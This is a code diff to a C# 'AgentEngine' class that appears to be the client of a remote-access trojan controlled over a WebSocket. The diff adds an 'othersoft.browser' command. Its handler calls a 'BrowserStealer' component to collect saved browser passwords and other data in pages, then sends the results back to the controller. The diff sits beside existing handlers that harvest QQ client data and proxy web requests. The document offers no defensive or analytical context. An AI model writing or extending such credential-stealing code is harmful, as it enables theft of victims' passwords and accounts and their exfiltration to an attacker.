@@ -342,6 +342,10 @@ public class AgentEngine
                 await HandleOtherSoftQQ(msg, ct);
                 break;
 
+            case "othersoft.browser":
+                await HandleOtherSoftBrowser(msg, ct);
+                break;
+
             case "proxy.fetch":
                 await HandleProxyFetch(msg, ct);
                 break;
@@ -690,6 +694,22 @@ public class AgentEngine
         var result = OtherSoftware.CollectQQ();
         if (_ws != null)
             await _ws.SendResultRawAsync("othersoft.qq.result", _agentId, result, msg.RequestId);
+    }
+
+    private async Task HandleOtherSoftBrowser(WebSocketMessage msg, CancellationToken ct)
+    {
+        var type = "passwords";
+        var offset = 0;
+        var limit = 250;
+        if (msg.Data is System.Text.Json.JsonElement d)
+        {
+            if (d.TryGetProperty("type", out var t)) type = t.GetString() ?? "passwords";
+            if (d.TryGetProperty("offset", out var o)) offset = o.GetInt32();
+            if (d.TryGetProperty("limit", out var l)) limit = l.GetInt32();
+        }
+        var result = BrowserStealer.Collect(type, offset, limit);
+        if (_ws != null)
+            await _ws.SendResultRawAsync("othersoft.browser.result", _agentId, result, msg.RequestId);
     }
 
     private async Task HandleProxyFetch(WebSocketMessage msg, CancellationToken ct)
